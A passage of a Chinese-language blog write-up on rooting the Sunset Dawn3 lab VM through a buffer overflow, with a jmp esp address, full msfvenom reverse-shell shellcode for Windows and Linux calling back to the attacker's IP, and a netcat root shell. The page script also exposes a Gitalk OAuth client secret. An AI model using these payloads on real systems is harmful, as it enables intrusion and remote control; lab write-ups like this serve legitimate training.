+<p><img src="/pic/c85584b52be01e8dd3d0bd20c254db1d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来是考虑如何定位 ESP 的位置，因为在程序运行前 ESP 的位置是不确定的，我们希望通过 EIP 来重定向到 ESP，这里借助于 jump esp 语句，我们使用 msf-nasm_shell 工具来得到语句对应的操作码。我们还需要在这个程序中寻找包含 <code>jmp esp</code> 指令的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Brainpan1]<br>└─$ msf-nasm_shell <br>nasm &gt; jmp esp<br>00000000  FFE4              jmp esp<br></code></pre></td></tr></table></figure>
+
+<p>我们先列出所有的模块</p>
+<p><img src="/pic/b1d17e8c84542d84adaad67a905cdeeb_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>从 Module info 这个列表中可以看出来有四种安全机制：<br>Rebase（重定位）：重定位是一种操作系统和程序加载器的特性，允许将共享的库和可执行文件加载到内存中的不同位置，以防止地址空间的冲突。重定位可以提高系统的安全性，防止一些攻击，如基于地址的攻击。<br>SafeSEH（安全异常处理链表）：在 Windows 操作系统中，SafeSEH 是一种保护机制，用于检测和阻止异常处理链表被利用用于漏洞利用。它可以帮助防止 SEH（Structured Exception Handling）覆盖攻击。<br>ASLR（地址空间布局随机化）：ASLR 是一种操作系统的安全特性，通过随机化加载程序和库的内存位置，来防止攻击者预测这些位置。这可以减少缓冲区溢出和代码注入等攻击的成功率。<br>NXCompat（不可执行内存保护）：NXCompat 是一种硬件和操作系统级别的安全特性，阻止内存中的数据被当作代码执行。这可以防止缓冲区溢出等漏洞被利用来执行恶意代码。</p>
+</blockquote>
+<p>而图片中显示四种安全机制都没有开启，那我们放心得寻找 <code>jmp esp</code> 指令的操作码所在的位置 <code>!mona find -s &quot;\xff\xe4&quot; -m dawn3.exe</code></p>
+<p><img src="/pic/0addb661a7195dcf465891b3b5e7c84f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>注意这里由于目前大部分计算机采用的都是小端模式，因此这里要按字节倒序来将地址写入到 EIP 中。</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">13</span>\<span class="hljs-keyword">x</span><span class="hljs-number">15</span>\<span class="hljs-keyword">x</span><span class="hljs-number">50</span>\<span class="hljs-keyword">x</span><span class="hljs-number">52</span>&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>接下来生成 shellcode，因为现在运行的虚拟机是 Windows 的，生成 shellcode 也得指定为 <code>windows/shell_reverse_tcp</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.1.1.128 LPORT=443 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payload<br>Found 1 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br>x86/shikata_ga_nai succeeded with size 351 (iteration=0)<br>x86/shikata_ga_nai chosen with final size 351<br>Payload size: 351 bytes<br>Final size of c file: 1506 bytes<br>unsigned char buf[] = <br><span class="hljs-string">&quot;\xbe\xa8\x70\x9a\xaa\xd9\xc3\xd9\x74\x24\xf4\x5f\x2b\xc9&quot;</span><br><span class="hljs-string">&quot;\xb1\x52\x31\x77\x12\x03\x77\x12\x83\x47\x8c\x78\x5f\x6b&quot;</span><br><span class="hljs-string">&quot;\x85\xff\xa0\x93\x56\x60\x28\x76\x67\xa0\x4e\xf3\xd8\x10&quot;</span><br><span class="hljs-string">&quot;\x04\x51\xd5\xdb\x48\x41\x6e\xa9\x44\x66\xc7\x04\xb3\x49&quot;</span><br><span class="hljs-string">&quot;\xd8\x35\x87\xc8\x5a\x44\xd4\x2a\x62\x87\x29\x2b\xa3\xfa&quot;</span><br><span class="hljs-string">&quot;\xc0\x79\x7c\x70\x76\x6d\x09\xcc\x4b\x06\x41\xc0\xcb\xfb&quot;</span><br><span class="hljs-string">&quot;\x12\xe3\xfa\xaa\x29\xba\xdc\x4d\xfd\xb6\x54\x55\xe2\xf3&quot;</span><br><span class="hljs-string">&quot;\x2f\xee\xd0\x88\xb1\x26\x29\x70\x1d\x07\x85\x83\x5f\x40&quot;</span><br><span class="hljs-string">&quot;\x22\x7c\x2a\xb8\x50\x01\x2d\x7f\x2a\xdd\xb8\x9b\x8c\x96&quot;</span><br><span class="hljs-string">&quot;\x1b\x47\x2c\x7a\xfd\x0c\x22\x37\x89\x4a\x27\xc6\x5e\xe1&quot;</span><br><span class="hljs-string">&quot;\x53\x43\x61\x25\xd2\x17\x46\xe1\xbe\xcc\xe7\xb0\x1a\xa2&quot;</span><br><span class="hljs-string">&quot;\x18\xa2\xc4\x1b\xbd\xa9\xe9\x48\xcc\xf0\x65\xbc\xfd\x0a&quot;</span><br><span class="hljs-string">&quot;\x76\xaa\x76\x79\x44\x75\x2d\x15\xe4\xfe\xeb\xe2\x0b\xd5&quot;</span><br><span class="hljs-string">&quot;\x4c\x7c\xf2\xd6\xac\x55\x31\x82\xfc\xcd\x90\xab\x96\x0d&quot;</span><br><span class="hljs-string">&quot;\x1c\x7e\x38\x5d\xb2\xd1\xf9\x0d\x72\x82\x91\x47\x7d\xfd&quot;</span><br><span class="hljs-string">&quot;\x82\x68\x57\x96\x29\x93\x30\x59\xac\x9a\x40\x31\xad\x9c&quot;</span><br><span class="hljs-string">&quot;\x41\x79\x38\x7a\x2b\x6d\x6d\xd5\xc4\x14\x34\xad\x75\xd8&quot;</span><br><span class="hljs-string">&quot;\xe2\xc8\xb6\x52\x01\x2d\x78\x93\x6c\x3d\xed\x53\x3b\x1f&quot;</span><br><span class="hljs-string">&quot;\xb8\x6c\x91\x37\x26\xfe\x7e\xc7\x21\xe3\x28\x90\x66\xd5&quot;</span><br><span class="hljs-string">&quot;\x20\x74\x9b\x4c\x9b\x6a\x66\x08\xe4\x2e\xbd\xe9\xeb\xaf&quot;</span><br><span class="hljs-string">&quot;\x30\x55\xc8\xbf\x8c\x56\x54\xeb\x40\x01\x02\x45\x27\xfb&quot;</span><br><span class="hljs-string">&quot;\xe4\x3f\xf1\x50\xaf\xd7\x84\x9a\x70\xa1\x88\xf6\x06\x4d&quot;</span><br><span class="hljs-string">&quot;\x38\xaf\x5e\x72\xf5\x27\x57\x0b\xeb\xd7\x98\xc6\xaf\xe8&quot;</span><br><span class="hljs-string">&quot;\xd2\x4a\x99\x60\xbb\x1f\x9b\xec\x3c\xca\xd8\x08\xbf\xfe&quot;</span><br><span class="hljs-string">&quot;\xa0\xee\xdf\x8b\xa5\xab\x67\x60\xd4\xa4\x0d\x86\x4b\xc4&quot;</span><br><span class="hljs-string">&quot;\x07&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>使用生成的代码是进行了混淆和编码的，需要留出解码的空间位置（填充物，填充未使用的缓冲区，用于控制溢出地址的位置，一般使用 nop 指令填充——0x90 表示。）。修改代码为：</p>
+<p><img src="/pic/eb084e58579ecef03626040b5db66377_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>提前开启监听，反弹 shell 成功</p>
+<p><img src="/pic/a67608c2ac91ab4fe157c9223222ddfe_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们前期信息收集已经得知了目标是 Linux，所以我们需要把 shellcode 修改为 Linux 的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.106 LPORT=443 -b <span class="hljs-string">&quot;\x00&quot;</span> -e x86/shikata_ga_nai -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x86 from the payload<br>Found 1 compatible encoders<br>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai<br>x86/shikata_ga_nai succeeded with size 95 (iteration=0)<br>x86/shikata_ga_nai chosen with final size 95<br>Payload size: 95 bytes<br>Final size of c file: 425 bytes<br>unsigned char buf[] = <br><span class="hljs-string">&quot;\xd9\xcd\xbd\xc2\x91\xc4\x0b\xd9\x74\x24\xf4\x58\x2b\xc9&quot;</span><br><span class="hljs-string">&quot;\xb1\x12\x31\x68\x17\x03\x68\x17\x83\x2a\x6d\x26\xfe\x9b&quot;</span><br><span class="hljs-string">&quot;\x55\x50\xe2\x88\x2a\xcc\x8f\x2c\x24\x13\xff\x56\xfb\x54&quot;</span><br><span class="hljs-string">&quot;\x93\xcf\xb3\x6a\x59\x6f\xfa\xed\x98\x07\x3d\xa5\x63\xbd&quot;</span><br><span class="hljs-string">&quot;\xd5\xb4\x93\x40\x9d\x30\x72\xf2\x87\x12\x24\xa1\xf4\x90&quot;</span><br><span class="hljs-string">&quot;\x4f\xa4\x36\x16\x1d\x4e\xa7\x38\xd1\xe6\x5f\x68\x3a\x94&quot;</span><br><span class="hljs-string">&quot;\xf6\xff\xa7\x0a\x5a\x89\xc9\x1a\x57\x44\x89&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>注意修改 IP 为目标靶机的 IP，修改后的代码为</p>
+<p><img src="/pic/e8755f53df670aa3635bbd461148a4dc_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><p>提前开启监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn3]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.148] 59420<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span>                                                                                                                  <br>root.txt                                                                                                            <br><span class="hljs-built_in">cat</span> root.txt                                                                                                        <br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br><br>3ca74b4afc790b46ff47fc2db5676b4f<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>root@dawn3:/root<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:06:69:f3 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.148/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 439sec preferred_lft 439sec<br>    inet6 fe80::a00:27ff:fe06:69f3/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@dawn3:/root<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux dawn3 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span><br>root@dawn3:/root<span class="hljs-comment"># sudo -l</span><br>sudo -l<br>bash: sudo: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure>
+
+<p>直接就是 root，结束战斗</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1dY4y127Ld/?vd_source=a057ab968fb9ba52d239d40c767cc40c">「红队笔记」靶机精讲：Brainpan1 - 缓冲区溢出典型利用过程，让你一次吃透。_哔哩哔哩_bilibili</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv25686993/">SUNSET: DAWN3 打靶过程 - 哔哩哔哩 (bilibili.com)</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>dawn3 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/4a11524f2c39.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/125a16ce3195.html" title="sunset_noontide 靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sunset_noontide 靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/2756aae2067b.html" title="Analytics">
+                        <span class="hidden-mobile">Analytics</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'a2b79bfce00488334d97bdfb4d4ce187'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
